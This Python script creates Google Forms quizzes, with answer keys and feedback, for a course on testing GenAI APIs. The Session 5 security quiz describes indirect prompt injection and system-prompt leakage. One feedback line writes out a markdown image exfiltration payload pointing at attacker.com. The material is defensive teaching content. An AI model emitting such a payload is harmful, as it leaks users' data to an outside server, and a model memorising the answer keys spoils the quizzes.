#!/usr/bin/env python3
"""
Create Google Forms quizzes for the GenAI API Testing Course.
7 quizzes (Sessions 0-5 + Capstone), 10 questions each, auto-graded with immediate feedback.

Usage:
    source .venv/bin/activate
    python create_quizzes.py
"""

import json
import os
from pathlib import Path

from google.auth.transport.requests import Request
from google.oauth2.credentials import Credentials
from google_auth_oauthlib.flow import InstalledAppFlow
from googleapiclient.discovery import build

SCOPES = [
    "https://www.googleapis.com/auth/forms.body",
    "https://www.googleapis.com/auth/drive.file",
]

BASE_DIR = Path(__file__).parent
CREDENTIALS_FILE = BASE_DIR / "credentials.json"
TOKEN_FILE = BASE_DIR / "token.json"


def authenticate():
    """Authenticate via OAuth and return credentials."""
    creds = None
    if TOKEN_FILE.exists():
        creds = Credentials.from_authorized_user_file(str(TOKEN_FILE), SCOPES)
    if not creds or not creds.valid:
        if creds and creds.expired and creds.refresh_token:
            creds.refresh(Request())
        else:
            flow = InstalledAppFlow.from_client_secrets_file(str(CREDENTIALS_FILE), SCOPES)
            creds = flow.run_local_server(port=0)
        TOKEN_FILE.write_text(creds.to_json())
    return creds


# ---------------------------------------------------------------------------
# Quiz definitions: 7 sessions, 10 questions each (mix of MC and true/false)
# ---------------------------------------------------------------------------

QUIZZES = [
    {
        "title": "Session 0 Quiz: HTTP & API Fundamentals",
        "description": "Test your understanding of HTTP concepts, status codes, JSON, and authentication as they apply to API testing.",
        "questions": [
            {
                "text": "Which HTTP method is used to send a prompt to a GenAI API and receive a completion?",
                "type": "mc",
                "options": ["GET", "POST", "PUT", "DELETE"],
                "correct": 1,
                "feedback": "POST is used because you are sending data (the prompt) to create something new (the completion).",
            },
            {
                "text": "A 429 status code means the server encountered an internal error.",
                "type": "tf",
                "correct": False,
                "feedback": "429 means 'Too Many Requests' — you have hit a rate limit. 500 is the internal server error code.",
            },
            {
                "text": "What does the Authorization header typically contain when calling the ChatAssist API?",
                "type": "mc",
                "options": [
                    "A session cookie",
                    "A Bearer token (API key)",
                    "A username and password",
                    "A CSRF token",
                ],
                "correct": 1,
                "feedback": "GenAI APIs use Bearer token authentication: 'Authorization: Bearer ca-key-...'",
            },
            {
                "text": "In a ChatAssist API response, the model's answer text is found at the JSON path choices[0].message.content.",
                "type": "tf",
                "correct": True,
                "feedback": "This is the single most important path in GenAI API testing — it's where the model's answer lives.",
            },
            {
                "text": "Which status code family indicates that the error is on the client side (your request is wrong)?",
                "type": "mc",
                "options": ["2xx", "3xx", "4xx", "5xx"],
                "correct": 2,
                "feedback": "4xx codes indicate client errors: bad request (400), unauthorized (401), forbidden (403), rate limited (429).",
            },
            {
                "text": "GenAI APIs typically have only one type of rate limit: requests per minute.",
                "type": "tf",
                "correct": False,
                "feedback": "GenAI APIs have dual rate limits: requests per minute AND tokens per minute. You can hit either independently.",
            },
            {
                "text": "What does the Content-Type: application/json header tell the server?",
                "type": "mc",
                "options": [
                    "The response should be in JSON format",
                    "The request body is formatted as JSON",
                    "The API key is encoded in JSON",
                    "The server should use JSON logging",
                ],
                "correct": 1,
                "feedback": "Content-Type tells the server what format your request body is in. For GenAI APIs, this is almost always application/json.",
            },
            {
                "text": "An idempotent HTTP method produces the same result when called multiple times with the same input.",
                "type": "tf",
                "correct": True,
                "feedback": "GET, PUT, and DELETE are idempotent. POST is not — sending the same prompt twice to a GenAI API can produce different results.",
            },
            {
                "text": "What information does the 'usage' object in a ChatAssist API response provide?",
                "type": "mc",
                "options": [
                    "The user's account balance",
                    "Token counts for the request (prompt_tokens, completion_tokens, total_tokens)",
                    "The number of API calls remaining today",
                    "The server's CPU and memory usage",
                ],
                "correct": 1,
                "feedback": "The usage object tracks token consumption: prompt_tokens (input), completion_tokens (output), and total_tokens (sum).",
            },
            {
                "text": "The Retry-After header in a 429 response tells you how many seconds to wait before retrying.",
                "type": "tf",
                "correct": True,
                "feedback": "When rate limited, the Retry-After header provides the wait time. Your test infrastructure should respect this value.",
            },
        ],
    },
    {
        "title": "Session 1 Quiz: How GenAI APIs Differ from Normal APIs",
        "description": "Test your understanding of non-determinism, tokens, model parameters, and the four modes of GenAI API operation.",
        "questions": [
            {
                "text": "Why can the same prompt sent to a GenAI API produce different responses each time?",
                "type": "mc",
                "options": [
                    "The API has a bug",
                    "The model generates responses by sampling from a probability distribution",
                    "The server load varies between requests",
                    "The API key changes the output",
                ],
                "correct": 1,
                "feedback": "GenAI models predict the next token by sampling from probabilities. Different samples = different outputs. This is by design, not a bug.",
            },
            {
                "text": "Setting temperature=0 guarantees identical outputs for the same prompt every time.",
                "type": "tf",
                "correct": False,
                "feedback": "Even at temperature=0, floating-point arithmetic and batch processing variations can produce subtly different results.",
            },
            {
                "text": "What does the temperature parameter control?",
                "type": "mc",
                "options": [
                    "The speed of the API response",
                    "The amount of randomness in token selection",
                    "The maximum length of the response",
                    "The cost per token",
                ],
                "correct": 1,
                "feedback": "Temperature controls randomness: 0.0 = nearly deterministic, 2.0 = highly creative/random.",
            },
            {
                "text": "In the ChatAssist API used in this course, structured output mode with strict: true is designed to enforce schema conformance.",
                "type": "tf",
                "correct": True,
                "feedback": "For this course's ChatAssist spec, strict: true constrains responses to valid JSON matching your schema. This is the first line of defense for testability.",
            },
            {
                "text": "When the model requests a tool call, what is the value of finish_reason?",
                "type": "mc",
                "options": [
                    "\"stop\"",
                    "\"tool_calls\"",
                    "\"length\"",
                    "\"error\"",
                ],
                "correct": 1,
                "feedback": "finish_reason: 'tool_calls' signals that the model wants to execute a function rather than provide a direct text response.",
            },
            {
                "text": "A token is always exactly one word.",
                "type": "tf",
                "correct": False,
                "feedback": "Tokens are subword units. Common words may be one token, but longer words get split (e.g., 'unbelievable' = 3 tokens). Roughly 1 token ≈ 4 characters.",
            },
            {
                "text": "In streaming mode, how do you get the complete response text?",
                "type": "mc",
                "options": [
                    "Read the last chunk only",
                    "Concatenate all delta.content fragments from each chunk",
                    "Parse the usage object in the first chunk",
                    "Wait for the server to send a complete response after the stream ends",
                ],
                "correct": 1,
                "feedback": "Each streaming chunk contains a small delta.content fragment. You must concatenate all fragments to get the full response.",
            },
            {
                "text": "In this course's cost model, failed API requests can still consume input tokens and incur cost.",
                "type": "tf",
                "correct": True,
                "feedback": "Prompt processing can still consume tokens even when a request fails. This is a common hidden cost in GenAI API testing.",
            },
            {
                "text": "Why is model version pinning important for test stability?",
                "type": "mc",
                "options": [
                    "Newer models are always worse",
                    "Default model aliases can silently update, changing behavior and breaking tests",
                    "Pinning reduces API costs",
                    "Older models respond faster",
                ],
                "correct": 1,
                "feedback": "Model version drift is the #1 operational surprise. Default aliases like 'chatassist-4' can point to different versions over time.",
            },
            {
                "text": "The traditional API contract is 'same input, same output.' The GenAI API contract is 'same input, reasonable output.'",
                "type": "tf",
                "correct": True,
                "feedback": "This is the fundamental shift. Your assertion strategy must match this new contract — test invariants and acceptance bands, not exact text.",
            },
        ],
    },
    {
        "title": "Session 2 Quiz: The Assertion Ladder",
        "description": "Test your understanding of the five assertion levels, LLM-as-judge, and choosing appropriate assertion strategies.",
        "questions": [
            {
                "text": "Which assertion level is the STRONGEST (most deterministic)?",
                "type": "mc",
                "options": [
                    "Semantic similarity",
                    "LLM-as-judge",
                    "Structural validation (JSON schema, required fields)",
                    "Content containment",
                ],
                "correct": 2,
                "feedback": "Structural validation (Level 1) is the strongest — checking status codes, JSON parseability, schema conformance, and required fields is fully deterministic.",
            },
            {
                "text": "Using exact string matching to assert on free-text GenAI output is a best practice.",
                "type": "tf",
                "correct": False,
                "feedback": "This is an anti-pattern (red flag). Free-text GenAI output varies between calls. Use containment, similarity, or rubric-based assertions instead.",
            },
            {
                "text": "At which assertion level would you use cosine similarity between embeddings?",
                "type": "mc",
                "options": [
                    "Level 1: Structural",
                    "Level 2: Content containment",
                    "Level 3: Semantic similarity",
                    "Level 4: LLM-as-judge",
                ],
                "correct": 2,
                "feedback": "Level 3 (semantic similarity) compares meaning using embedding vectors and cosine similarity, typically with a threshold like ≥ 0.85.",
            },
            {
                "text": "LLM-as-judge evaluations should use high temperature settings for consistency.",
                "type": "tf",
                "correct": False,
                "feedback": "Judge models should use temperature near 0 for maximum consistency. High temperature adds unwanted randomness to the evaluation itself.",
            },
            {
                "text": "What is the recommended principle for choosing assertion level?",
                "type": "mc",
                "options": [
                    "Always use the weakest assertion to avoid flaky tests",
                    "Always use LLM-as-judge for everything",
                    "Assert at the strongest level that is stable for the given requirement",
                    "Use exact string matching whenever possible",
                ],
                "correct": 2,
                "feedback": "Choose the strongest assertion that is stable. Use structural checks where possible, and only move up to softer assertions when the requirement demands it.",
            },
            {
                "text": "Layering multiple assertion levels on the same response is a recommended practice.",
                "type": "tf",
                "correct": True,
                "feedback": "Best practice is to layer: e.g., L1 (valid JSON) + L2 (contains required fields) + L3 (semantically similar to reference). Each layer catches different failure modes.",
            },
            {
                "text": "What is a key risk of LLM-as-judge evaluation?",
                "type": "mc",
                "options": [
                    "It is too fast",
                    "The judge model can be inconsistent and has biases (position bias, length bias)",
                    "It only works with structured output",
                    "It cannot evaluate tone or correctness",
                ],
                "correct": 1,
                "feedback": "LLM judges can suffer from position bias, length bias, and inconsistency. Calibrate against human labels (Cohen's kappa > 0.8) and use chain-of-thought prompting.",
            },
            {
                "text": "Structured output mode eliminates the need for any assertions on the response.",
                "type": "tf",
                "correct": False,
                "feedback": "Structured output guarantees format but not content quality. You still need content-level assertions to verify the values are correct and relevant.",
            },
            {
                "text": "A test checks that a customer support response mentions the company's 30-day return policy. Which assertion level is most appropriate?",
                "type": "mc",
                "options": [
                    "Level 1: Structural (check JSON schema)",
                    "Level 2: Content containment (check for key phrases like '30-day' and 'return')",
                    "Level 3: Semantic similarity",
                    "Level 5: Statistical aggregate",
                ],
                "correct": 1,
                "feedback": "Content containment (Level 2) is ideal here — check that specific factual elements ('30-day', 'return') are present without requiring exact wording.",
            },
            {
                "text": "Statistical/aggregate assertions (Level 5) run across many test executions to detect quality trends over time.",
                "type": "tf",
                "correct": True,
                "feedback": "Level 5 assertions track metrics across runs — e.g., 'average rubric score should not drop below 4.0 over the last 100 evaluations.' They detect drift rather than individual failures.",
            },
        ],
    },
    {
        "title": "Session 3 Quiz: Coverage Model",
        "description": "Test your understanding of the six-axis coverage map, coverage gaps, and tiered CI/CD evaluation strategies.",
        "questions": [
            {
                "text": "Which of the following is NOT one of the six coverage axes for GenAI API testing?",
                "type": "mc",
                "options": [
                    "Input modality",
                    "Browser compatibility",
                    "Safety regime",
                    "Failure modes",
                ],
                "correct": 1,
                "feedback": "Browser compatibility is a UI testing concern. The six GenAI axes are: input modality, response mode, output contract, safety regime, failure modes, and non-functional.",
            },
            {
                "text": "A test suite that only tests happy-path completions has good coverage for a GenAI API.",
                "type": "tf",
                "correct": False,
                "feedback": "Happy-path-only coverage misses rate limits, safety blocks, streaming errors, schema breaks, adversarial inputs, and non-functional requirements.",
            },
            {
                "text": "In the tiered CI/CD evaluation model, which tier runs on every pull request?",
                "type": "mc",
                "options": [
                    "Deep tier (red teaming, human review)",
                    "Standard tier (full evaluation suite)",
                    "Fast tier (deterministic structural checks)",
                    "All tiers run on every PR",
                ],
                "correct": 2,
                "feedback": "Fast tier runs on every PR with deterministic checks (schema validation, contract tests). Standard runs nightly. Deep runs pre-release.",
            },
            {
                "text": "The 'output contract' coverage axis distinguishes between free-text, structured JSON, and tool/function call responses.",
                "type": "tf",
                "correct": True,
                "feedback": "Each output contract type has different assertion strategies and failure modes, so each needs dedicated test coverage.",
            },
            {
                "text": "What does the 'safety regime' coverage axis test?",
                "type": "mc",
                "options": [
                    "Server uptime and availability",
                    "How the API handles normal requests, borderline requests that should be refused, and adversarial inputs",
                    "Network encryption and TLS certificates",
                    "Token consumption and cost limits",
                ],
                "correct": 1,
                "feedback": "Safety regime covers normal requests, borderline-refuse scenarios, sensitive-but-safe content, and adversarial inputs (prompt injection).",
            },
            {
                "text": "Cost tracking per test run is unnecessary since GenAI API prices have dropped significantly.",
                "type": "tf",
                "correct": False,
                "feedback": "While per-token prices dropped, consumption has exploded. Cost awareness must be built into test design — especially for LLM-as-judge evals that double costs.",
            },
            {
                "text": "When auditing an unknown project's test suite, what should you do FIRST?",
                "type": "mc",
                "options": [
                    "Rewrite all tests from scratch",
                    "Map existing tests to the coverage matrix to identify gaps",
                    "Delete any flaky tests",
                    "Add LLM-as-judge to every test",
                ],
                "correct": 1,
                "feedback": "First, inventory and map existing tests against the coverage matrix. This reveals gaps without disrupting what already works.",
            },
            {
                "text": "The non-functional coverage axis includes latency, cost/tokens, concurrency, and retry/backoff behavior.",
                "type": "tf",
                "correct": True,
                "feedback": "Non-functional requirements are critical for GenAI APIs — latency varies with output length, costs scale with tokens, and concurrency hits rate limits.",
            },
            {
                "text": "A team has tests for completion and structured output, but no tests for streaming chunks, mid-stream errors, or chunk assembly. Which coverage gap is this?",
                "type": "mc",
                "options": [
                    "Basic authentication testing",
                    "Streaming mode and partial failure handling",
                    "Testing that the API returns JSON",
                    "Checking HTTP status codes",
                ],
                "correct": 1,
                "feedback": "This is a response-mode coverage gap: streaming behavior (including partial and error scenarios) is untested.",
            },
            {
                "text": "A coverage matrix should be filled in once and never updated.",
                "type": "tf",
                "correct": False,
                "feedback": "The coverage matrix is a living document. As the API evolves (new modes, new models, new features), the matrix must be updated to reflect new coverage needs.",
            },
        ],
    },
    {
        "title": "Session 4 Quiz: Flakiness, Drift, and Triage",
        "description": "Test your ability to classify failures, distinguish flakiness from regressions, and apply the triage decision tree.",
        "questions": [
            {
                "text": "A test fails because the model responded with different (but correct) wording. This is an example of:",
                "type": "mc",
                "options": [
                    "A genuine regression",
                    "An infrastructure failure",
                    "Model variance (expected non-determinism)",
                    "A contract/schema break",
                ],
                "correct": 2,
                "feedback": "Different but correct wording is expected model variance — not a bug. The test assertion is likely too strict for non-deterministic output.",
            },
            {
                "text": "If a test fails consistently across multiple retries with the same error, it is more likely a regression than a flake.",
                "type": "tf",
                "correct": True,
                "feedback": "Flakes are intermittent by nature. Consistent failure across retries suggests a real regression, schema break, or infrastructure issue.",
            },
            {
                "text": "In this course's triage model, a 429 'Too Many Requests' error is first classified under which broad failure category?",
                "type": "mc",
                "options": [
                    "Infrastructure/transport",
                    "Capacity/quota",
                    "Contract/schema break",
                    "Model drift",
                ],
                "correct": 0,
                "feedback": "In the triage model, 429 is an infrastructure/transport-path error first; then you narrow root cause to capacity/quota (rate or token limits).",
            },
            {
                "text": "Model drift means the model's behavior changes over time, potentially degrading quality even without any code changes.",
                "type": "tf",
                "correct": True,
                "feedback": "Model drift is a silent quality shift — rubric scores drop, formatting changes, or hallucination rates increase after a model version update.",
            },
            {
                "text": "Quality scores dropping across MANY tests simultaneously after a model version change most likely indicates:",
                "type": "mc",
                "options": [
                    "A test infrastructure problem",
                    "Individual test bugs",
                    "Model drift/regression",
                    "Rate limiting",
                ],
                "correct": 2,
                "feedback": "Widespread quality score drops correlated with a model version change is the classic signal for model drift/regression.",
            },
            {
                "text": "Retrying a failed GenAI API test and getting a different (passing) result always means the original failure was a flake.",
                "type": "tf",
                "correct": False,
                "feedback": "In GenAI testing, retries produce different outputs by design. A passing retry doesn't confirm the original was a flake — the model is non-deterministic.",
            },
            {
                "text": "What are the four categories of LLM test flakiness?",
                "type": "mc",
                "options": [
                    "Timing, rendering, network, browser",
                    "Model-side, infrastructure, test design, evaluation",
                    "Input, output, schema, security",
                    "Fast, standard, deep, manual",
                ],
                "correct": 1,
                "feedback": "The four flakiness categories: model-side (sampling variation), infrastructure (rate limits, timeouts), test design (overly strict assertions), and evaluation (judge inconsistency).",
            },
            {
                "text": "A 'test smell' in GenAI API testing includes brittle assertions and relying on unstated assumptions about model behavior.",
                "type": "tf",
                "correct": True,
                "feedback": "Test smells include exact string matching on free text, hardcoded expected values, assertions without tolerance bands, and assuming specific formatting.",
            },
            {
                "text": "If JSON parsing fails on an API response, what should you check FIRST?",
                "type": "mc",
                "options": [
                    "Whether the API key expired",
                    "Whether the response was truncated by max_tokens, or if streaming chunk assembly failed",
                    "Whether the model version changed",
                    "Whether the temperature was too high",
                ],
                "correct": 1,
                "feedback": "JSON parsing failures are usually caused by truncation (max_tokens hit mid-JSON) or streaming assembly errors, not model behavior.",
            },
            {
                "text": "The continuous feedback loop pattern is: Deploy → Observe → Identify failures → Add to test suite → Fix → Redeploy.",
                "type": "tf",
                "correct": True,
                "feedback": "This is the gold standard workflow for mature GenAI testing teams — production observations feed back into the test suite continuously.",
            },
        ],
    },
    {
        "title": "Session 5 Quiz: Security and Responsible Testing",
        "description": "Test your understanding of OWASP LLM Top 10, prompt injection, PII risks, and responsible testing practices.",
        "questions": [
            {
                "text": "According to OWASP Top 10 for LLM Applications 2025, what is the #1 risk?",
                "type": "mc",
                "options": [
                    "Sensitive information disclosure",
                    "Prompt injection",
                    "Supply chain vulnerabilities",
                    "Excessive agency",
                ],
                "correct": 1,
                "feedback": "Prompt Injection (LLM01) remains the #1 risk — it's the most exploited LLM vulnerability, analogous to SQL injection for databases.",
            },
            {
                "text": "A test suite that logs raw API prompts and responses containing customer data is a security risk.",
                "type": "tf",
                "correct": True,
                "feedback": "Logging raw prompts/responses can expose PII, system prompts, and sensitive context. Always have a redaction policy for test logs.",
            },
            {
                "text": "What is 'indirect prompt injection'?",
                "type": "mc",
                "options": [
                    "Injecting SQL into a database via the API",
                    "Attacks embedded in data the model processes (e.g., poisoned tool results, hidden text in documents) rather than in the user's direct input",
                    "Using a VPN to bypass API rate limits",
                    "Sending malformed JSON in the request body",
                ],
                "correct": 1,
                "feedback": "Indirect prompt injection hides attack instructions in data the model processes — tool results, RAG documents, or linked content — not in the user's direct message.",
            },
            {
                "text": "Hardcoding API keys in test scripts is acceptable as long as the repository is private.",
                "type": "tf",
                "correct": False,
                "feedback": "Never hardcode API keys. Private repos can be cloned, forked, or leaked. Use environment variables or secrets management instead.",
            },
            {
                "text": "Which of the following is a NEW addition to the OWASP Top 10 for LLMs in 2025 (not present in 2023)?",
                "type": "mc",
                "options": [
                    "Prompt injection",
                    "Insecure output handling",
                    "Vector and embedding weaknesses",
                    "Model denial of service",
                ],
                "correct": 2,
                "feedback": "Vector/Embedding Weaknesses (LLM08) is new in 2025, reflecting the rise of RAG systems where poisoned embeddings can compromise retrieval.",
            },
            {
                "text": "Prompt injection is often called 'the SQL injection of the AI era.'",
                "type": "tf",
                "correct": True,
                "feedback": "Both exploit the same principle: untrusted input mixed with trusted instructions. The attack surface moved from database queries to model prompts.",
            },
            {
                "text": "What should you use instead of real customer data in test fixtures?",
                "type": "mc",
                "options": [
                    "Production database snapshots",
                    "Synthetic datasets with realistic but fake data",
                    "Anonymized data from competitors",
                    "Data from public social media profiles",
                ],
                "correct": 1,
                "feedback": "Use synthetic datasets — realistic but entirely fake data. This eliminates PII risk while maintaining test validity.",
            },
            {
                "text": "Markdown image injection is a prompt injection technique where a model is tricked into outputting a markdown image tag that exfiltrates data via the URL.",
                "type": "tf",
                "correct": True,
                "feedback": "The model outputs ![img](https://attacker.com/steal?data=...) — when rendered, the browser sends the data to the attacker's server. Test that your model refuses this.",
            },
            {
                "text": "Which international standard (published 2025) is the first specifically addressing AI testing?",
                "type": "mc",
                "options": [
                    "ISO 27001",
                    "ISO/IEC TS 42119-2:2025",
                    "GDPR Article 22",
                    "SOC 2 Type II",
                ],
                "correct": 1,
                "feedback": "ISO/IEC TS 42119-2:2025 is the first international AI testing standard, covering AI-specific test methods including red teaming for LLMs.",
            },
            {
                "text": "The principle of least privilege means test service accounts should only have the minimum API permissions needed.",
                "type": "tf",
                "correct": True,
                "feedback": "Test accounts with excessive permissions (admin access, production data access) increase blast radius if credentials are compromised.",
            },
        ],
    },
    {
        "title": "Capstone Quiz: Put It All Together",
        "description": "Test your ability to apply all course concepts: HTTP, GenAI differences, assertions, coverage, triage, and security.",
        "questions": [
            {
                "text": "You join a new project and find tests that assert exact string matches on free-text completions. What framework from the course helps you propose improvements?",
                "type": "mc",
                "options": [
                    "The HTTP status code reference",
                    "The assertion ladder — move from exact match to containment, similarity, or rubric-based assertions",
                    "The rate limiting guidelines",
                    "The OWASP Top 10",
                ],
                "correct": 1,
                "feedback": "The assertion ladder (Session 2) provides the framework: identify the current assertion level, then choose the strongest level that is stable for each test.",
            },
            {
                "text": "Your first-week contribution to a new project should be rewriting all existing tests from scratch.",
                "type": "tf",
                "correct": False,
                "feedback": "First, inventory and map existing tests to the coverage matrix. Then identify specific improvements (assertion mismatches, coverage gaps, stability fixes).",
            },
            {
                "text": "A CI run shows that 8 out of 40 tests failed after a model version update. Rubric scores dropped by 0.5 points on average. What type of failure is this?",
                "type": "mc",
                "options": [
                    "Infrastructure failure",
                    "Test design flakiness",
                    "Model drift/regression",
                    "Rate limiting",
                ],
                "correct": 2,
                "feedback": "Widespread quality drops correlated with a model version change = model drift/regression. Use the triage decision tree from Session 4.",
            },
            {
                "text": "When you find API keys hardcoded in test fixtures, this is both a security risk and a violation of the responsible testing checklist.",
                "type": "tf",
                "correct": True,
                "feedback": "Hardcoded keys are the most common security mistake in test suites. Move them to environment variables or secrets management immediately.",
            },
            {
                "text": "You discover the project has no streaming tests. Which course framework helps you articulate why this is a gap?",
                "type": "mc",
                "options": [
                    "The assertion ladder",
                    "The six-axis coverage matrix (response mode axis)",
                    "The failure triage decision tree",
                    "The glossary",
                ],
                "correct": 1,
                "feedback": "The coverage matrix (Session 3) — specifically the 'response mode' axis — shows that streaming is a distinct mode requiring dedicated test coverage.",
            },
            {
                "text": "Pinning temperature=0 eliminates all non-determinism and makes GenAI API tests as reliable as traditional API tests.",
                "type": "tf",
                "correct": False,
                "feedback": "Temperature=0 reduces but does not eliminate variation. GenAI tests still require tolerance-based assertions, not exact matches.",
            },
            {
                "text": "A test for a customer support bot should verify that the response never reveals the system prompt. Which OWASP category does this relate to?",
                "type": "mc",
                "options": [
                    "LLM01: Prompt Injection",
                    "LLM07: System Prompt Leakage",
                    "LLM06: Excessive Agency",
                    "LLM03: Supply Chain",
                ],
                "correct": 1,
                "feedback": "System Prompt Leakage (LLM07) is a standalone category in the 2025 OWASP Top 10, covering tests that verify the model doesn't expose its instructions.",
            },
            {
                "text": "The 'Bridge from UI Testing' concept means that UI testing skills are useless for API testing and must be completely unlearned.",
                "type": "tf",
                "correct": False,
                "feedback": "The bridge concept shows that many UI testing skills transfer directly. The mental models evolve (e.g., exact match → tolerance bands), they don't get discarded.",
            },
            {
                "text": "Which tiered CI/CD approach is recommended for balancing speed, cost, and thoroughness?",
                "type": "mc",
                "options": [
                    "Run all tests on every commit",
                    "Fast tier (every PR, deterministic checks), Standard tier (nightly, full evals), Deep tier (pre-release, red teaming)",
                    "Only run tests before major releases",
                    "Run security tests daily and skip all other tests",
                ],
                "correct": 1,
                "feedback": "The three-tier model balances speed and coverage: fast (every PR), standard (nightly), deep (pre-release). Each tier has different cost and time profiles.",
            },
            {
                "text": "The five recommended first-week contributions are: map coverage, identify assertion mismatches, propose stability improvements, improve reporting, and create a repo-specific triage guide.",
                "type": "tf",
                "correct": True,
                "feedback": "These five contributions add immediate value without requiring deep domain context — they apply course frameworks to the specific project.",
            },
        ],
    },
]


def make_choice_question(q, index):
    """Build a Google Forms API request item for a multiple choice or true/false question."""
    if q["type"] == "tf":
        options = ["True", "False"]
        correct_idx = 0 if q["correct"] else 1
    else:
        options = q["options"]
        correct_idx = q["correct"]

    grading = {
        "pointValue": 1,
        "correctAnswers": {"answers": [{"value": options[correct_idx]}]},
        "whenRight": {"text": q["feedback"]},
        "whenWrong": {"text": q["feedback"]},
    }

    return {
        "createItem": {
            "item": {
                "title": q["text"],
                "questionItem": {
                    "question": {
                        "required": True,
                        "grading": grading,
                        "choiceQuestion": {
                            "type": "RADIO",
                            "options": [{"value": opt} for opt in options],
                        },
                    }
                },
            },
            "location": {"index": index},
        }
    }


def create_quiz(forms_service, quiz_data):
    """Create a single Google Form quiz and return its edit + responder URLs."""
    # Step 1: Create the form
    form = forms_service.forms().create(
        body={"info": {"title": quiz_data["title"]}}
    ).execute()
    form_id = form["formId"]

    # Step 2: Convert to quiz with immediate feedback
    forms_service.forms().batchUpdate(
        formId=form_id,
        body={
            "requests": [
                {
                    "updateSettings": {
                        "settings": {
                            "quizSettings": {
                                "isQuiz": True,
                            }
                        },
                        "updateMask": "quizSettings.isQuiz",
                    }
                },
                {
                    "updateFormInfo": {
                        "info": {
                            "title": quiz_data["title"],
                            "description": quiz_data["description"],
                        },
                        "updateMask": "title,description",
                    }
                },
            ]
        },
    ).execute()

    # Step 3: Add questions
    requests = []
    for i, q in enumerate(quiz_data["questions"]):
        requests.append(make_choice_question(q, i))

    forms_service.forms().batchUpdate(
        formId=form_id,
        body={"requests": requests},
    ).execute()

    edit_url = f"https://docs.google.com/forms/d/{form_id}/edit"
    respond_url = f"https://docs.google.com/forms/d/{form_id}/viewform"
    return form_id, edit_url, respond_url


def main():
    print("Authenticating with Google...")
    creds = authenticate()
    forms_service = build("forms", "v1", credentials=creds)

    results = []
    for i, quiz in enumerate(QUIZZES):
        print(f"Creating quiz {i + 1}/{len(QUIZZES)}: {quiz['title']}...")
        form_id, edit_url, respond_url = create_quiz(forms_service, quiz)
        results.append({
            "title": quiz["title"],
            "form_id": form_id,
            "edit_url": edit_url,
            "respond_url": respond_url,
        })
        print(f"  Done: {respond_url}")

    # Save results
    output_file = BASE_DIR / "quiz_links.json"
    output_file.write_text(json.dumps(results, indent=2))

    # Print summary
    print("\n" + "=" * 70)
    print("ALL QUIZZES CREATED SUCCESSFULLY")
    print("=" * 70)
    for r in results:
        print(f"\n{r['title']}")
        print(f"  Take quiz: {r['respond_url']}")
        print(f"  Edit quiz: {r['edit_url']}")
    print(f"\nAll links saved to: {output_file}")


if __name__ == "__main__":
    main()
